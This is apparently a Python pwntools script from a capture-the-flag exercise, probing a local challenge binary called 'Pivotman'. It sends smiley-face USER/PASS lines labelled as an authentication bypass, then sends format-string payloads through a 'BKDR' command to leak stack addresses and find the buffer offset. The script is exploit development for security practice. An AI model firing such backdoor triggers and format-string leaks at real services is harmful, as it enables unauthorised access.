#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

CHALL_DIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Easy/Pivotman/pwn_pivotman/challenge'
ELF_PATH = f'{CHALL_DIR}/chall'
LD_PATH = f'{CHALL_DIR}/ld-linux-x86-64.so.2'

p = process([LD_PATH, ELF_PATH], cwd=CHALL_DIR)

# Wait for any output
data = p.recvuntil(b' \r\n', timeout=5)
log.info(f'Banner: {data}')

# Auth bypass
p.sendline(b'USER ;)')
data = p.recvuntil(b' \r\n')
log.info(f'USER: {data}')

p.sendline(b'PASS ;)')
data = p.recvuntil(b' \r\n')
log.info(f'PASS: {data}')

# Stage 1: leak
p.sendline(b'BKDR %2737$p.%2736$p')
data = p.recvuntil(b' \r\n')
log.info(f'BKDR leak: {data}')

# Try a simpler leak
p.sendline(b'BKDR %p.%p.%p.%p')
data = p.recvuntil(b' \r\n')
log.info(f'BKDR simple: {data}')

# Try reading position 1030 to verify buffer position
p.sendline(b'BKDR AAAABBBBCCCCDDDD%1030$p.%1031$p.%1032$p.%1033$p')
data = p.recvuntil(b' \r\n')
log.info(f'BKDR pos1030: {data}')

p.close()
